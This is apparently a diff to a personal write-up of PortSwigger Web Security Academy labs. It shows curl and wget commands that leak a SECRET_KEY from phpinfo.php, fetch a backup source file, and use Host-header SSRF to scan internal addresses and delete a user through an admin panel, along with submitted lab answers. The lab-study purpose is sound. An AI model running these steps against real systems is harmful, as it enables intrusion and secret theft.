@@ -3,7 +3,9 @@
 
 **Target**
 
-**Vulnerability**
+**Discovery**
+
+**Analysis**
 
 **Exploitation**
 
@@ -734,6 +736,57 @@ EOF
 
 **Mitigation**
 
+### Lab: Information disclosure on debug page
+
+**Target**
+
+    https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page
+
+**Discovery**
+
+    curl -s -k -L https://ac571f011f468d17c0f420a700fa0031.web-security-academy.net | grep -i debug
+
+**Analysis**
+
+Leakage of `SECRET_KEY` in `phpinfo.php` page.
+
+**Exploitation**
+
+```
+curl -s -k -L https://ac571f011f468d17c0f420a700fa0031.web-security-academy.net/cgi-bin/phpinfo.php | grep SECRET_KEY
+
+curl -s -k -L https://ac571f011f468d17c0f420a700fa0031.web-security-academy.net/submitSolution -d 'answer=wx102tvamfn28xd0mf6bc0lfw0omqk4o'
+```
+
+### Lab: Source code disclosure via backup files
+
+**Target**
+
+    https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-via-backup-files
+
+**Discovery**
+
+    curl -s https://ac751fc51e0579a9c02018c5003b00f7.web-security-academy.net/robots.txt
+
+**Exploitation**
+
+   wget https://ac751fc51e0579a9c02018c5003b00f7.web-security-academy.net/backup/ProductTemplate.java.bak
+   cat ProductTemplate.java.bak
+
+   curl -k -s https://ac751fc51e0579a9c02018c5003b00f7.web-security-academy.net/submitSolution -d 'answer=azgxgeekgrcvqe5lbheei6vqtppb9tuv'
+
+### Lab: LAB-NAME-HERE
+
+**Target**
+
+**Discovery**
+
+**Analysis**
+
+**Exploitation**
+
+**Mitigation**
+
 ## HTTP Host header attacks
 
 ### Lab: Basic password reset poisoning
@@ -778,6 +831,31 @@ csrf=joLaw8RAzKsT6UqhT6X5D2MzlfRk6avZ&temp-forgot-password-token=[token]&new-pas
 
 Do not rely on user's provided `Host` header when constructing reset link. Maintain whitelist of `Host` header value that could be used.
 
+### Lab: Routing-based SSRF
+
+**Target**
+
+    https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf
+
+**Discovery**
+
+    for i in $(seq 1 254); do echo; echo -n "HTTP code (192.168.0.$i): "; curl -s -o /dev/null -w "%{http_code}" -k -x 127.0.0.1:8080 -H "Host:192.168.0.$i" https://accb1f781f591110c0ef0e84001c00c1.web-security-academy.net/; done
+
+**Analysis**
+
+**Exploitation**
+
+Get `CSRF` token:
+
+    curl -s -L -k -x 127.0.0.1:8080 -H "Host:192.168.0.146" https://accb1f781f591110c0ef0e84001c00c1.web-security-academy.net/ | grep csrf | cut -d'"' -f6
+
+Delete user:
+
+    curl -L -k -x 127.0.0.1:8080 -H "Host:192.168.0.146" https://accb1f781f591110c0ef0e84001c00c1.web-security-academy.net/admin/delete -d "username=carlos&csrf=3opFh3G3pX6WfecTEeIMMWS5rXVJHlja"
+
+**Mitigation**
+
+Conduct proper (whitelisting) validation of `Host` header.
 
 ### Lab: Password reset poisoning via dangling markup
 
@@ -860,3 +938,17 @@ EOF
 **Mitigation**
 
 Do not rely solely on `Host` header as an authentication factor, in addition implement at least IP-based access control.
+
+### Lab: Web cache poisoning via ambiguous requests
+
+**Target**
+
+    https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests
+
+**Discovery**
+
+**Analysis**
+
+**Exploitation**
+
+**Mitigation**
